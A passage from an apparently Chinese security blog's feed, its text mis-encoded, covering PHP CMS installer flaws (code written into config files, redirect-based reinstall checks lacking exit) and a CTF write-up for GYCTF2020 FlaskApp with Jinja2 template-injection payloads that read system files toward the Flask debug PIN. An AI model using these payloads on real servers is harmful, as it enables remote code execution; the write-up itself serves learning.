title="installç³»ç»Ÿé‡è£…æ¼æ´"></a>installç³»ç»Ÿé‡è£…æ¼æ´</h4><p>åœ¨å®‰è£…è¿‡ç¨‹ä¸­ï¼Œ</p><p>éœ€è¦å¡«å†™Webåº”ç”¨çš„æ•°æ®åº“é…ç½®ï¼Œä¸€èˆ¬ä¼šå°†é…ç½®ç›´æ¥å†™å…¥åˆ°é…ç½®æ–‡ä»¶ä¸­ï¼Œ</p><p>åœ¨å†™å…¥çš„è¿‡ç¨‹ä¸­å¾€å¾€æ²¡æœ‰æ ¡éªŒ</p><p>(æœ‰å¯èƒ½å…¶ä»–å®‰è£…åä¿®æ”¹çš„åŠŸèƒ½ä¼šåšæ ¡éªŒ)ï¼Œå¯¼è‡´</p><p>ç›´æ¥å†™å…¥phpä»£ç åˆ°é…ç½®æ–‡ä»¶ä¸­ï¼Œ</p><p>ä»è€Œè¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„</p><p>installç³»ç»Ÿé‡è£…éªŒè¯ç»•è¿‡æ¼æ´</p><p>æŸäº›CMSçš„installçš„éªŒè¯ä¸ä¸¥è°¨ï¼Œå¯¼è‡´ç›´æ¥ç»•è¿‡é‡è£…ï¼Œä¾‹å¦‚</p><p>1.</p><p>ä½¿ç”¨JavaScriptè·³è½¬ï¼Œä½†æ˜¯åé¢çš„ä»£ç ä»ç„¶ä¼šè¢«æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this\-&gt;myclass-\&gt;notice(&#39;alert(&quot;ç³»ç»Ÿå·²å®‰è£…è¿‡&quot;);window.location.href&#x3D;&quot;&#39;.site_url().&#39;&quot;;&#39;);</span><br></pre></td></tr></table></figure><p>2.</p><p>ä½¿ç”¨header()</p><p>å‡½æ•°è¿›è¡Œè·³è½¬ï¼Œæ²¡æœ‰ä½¿ç”¨die()</p><p>æˆ–è€…exit()ç»“æŸï¼Œé‚£ä¹ˆåé¢éƒ¨åˆ†çš„ä»£ç ä»ç„¶ä¼š</p><p>è¢«æ‰§è¡Œ</p><p>//header å¤´å¹¶ä¸ä¼šç»“æŸä¹‹åçš„ä»£ç ï¼Œæ¼æ´å‡ºåœ¨è¿™é‡Œ</p><p>header( â€˜location: ../index.phpâ€™);</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨&quot;&gt;&lt;a href=&quot;#æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨&quot; class=&quot;headerlink&quot; title=&quot;æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨&quot;&gt;&lt;/a&gt;æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨&lt;/h4&gt;&lt;p&gt;1.æœç´¢ move_uploaded_file()å‡½æ•°, åœ¨PHPä¸­</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>GYCTF2020 FlaskApp</title>
    <link href="http://daweitech.github.io/2021/09/01/buu/17/"/>
    <id>http://daweitech.github.io/2021/09/01/buu/17/</id>
    <published>2021-09-01T07:29:25.000Z</published>
    <updated>2021-09-07T12:35:48.087Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/cbca419ba075">flaskæ¡†æ¶ä¸‹çš„ssti+pinç æ‰§è¡Œå‘½ä»¤ - ç®€ä¹¦ (jianshu.com)</a></p><p>[<a href="https://blog.csdn.net/SopRomeo/article/details/105875248">GYCTF2020]FlaskApp_SopRomeoçš„åšå®¢-CSDNåšå®¢</a></p><p>æœ€è¿‘åˆšå­¦äº†æ¨¡æ¿æ³¨å…¥ï¼Œè¿™é¢˜å°±ç›´æ¥é¡ºç€flaskçš„payloadå»</p><p><img src="/2021/09/01/buu/17/image-20210901155839298.png" alt="image-20210901155839298"></p><p>è¯•ç€ç”¨ç®€å•çš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;2+2&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡åŠ å¯†è§£å¯†æäº¤å</p><p><img src="/2021/09/01/buu/17/image-20210901160005521.png" alt="image-20210901160005521"></p><p>å†å°è¯•ç”¨systemå‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#39;ls&#39;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/buu/17/image-20210901160203877.png" alt="image-20210901160203877"></p><p>å¥½å®¶ä¼™ï¼Œæœç„¶è¢«è¿‡æ»¤äº†</p><p>è¯•äº†å‡ ä¸ªå…³é”®å­—éƒ½ä¸è¡Œåï¼ŒæŸ¥çœ‹æç¤ºï¼Œåœ¨æºç å¤„çœ‹åˆ°</p><p><img src="/2021/09/01/buu/17/image-20210901160310325.png" alt="image-20210901160310325"></p><p>çœ‹åˆ°PIN</p><p>æœæ–­ä¸Šç½‘æŸ¥äº†æ–‡ç« ï¼Œå‘ç°PINè¿˜æŒºéš¾å¾—åˆ°çš„</p><p>ä¸»è¦æ˜¯pythonè„šæœ¬ä¸ä¼šå†™ã€‚ã€‚ã€‚</p><p>æ¥ä¸‹æ¥æŒ‰ç…§æ­£å¸¸è§£é¢˜æµç¨‹ï¼š</p><p>payload1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><p><img src="/2021/09/01/buu/17/image-20210901160640173.png" alt="image-20210901160640173"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/cbca419ba075&quot;&gt;flaskæ¡†æ¶ä¸‹çš„ssti+pinç æ‰§è¡Œå‘½ä»¤ - ç®€ä¹¦ (jianshu.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[&lt;a href=&quot;https://blog.csdn.net/Sop</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
</feed>
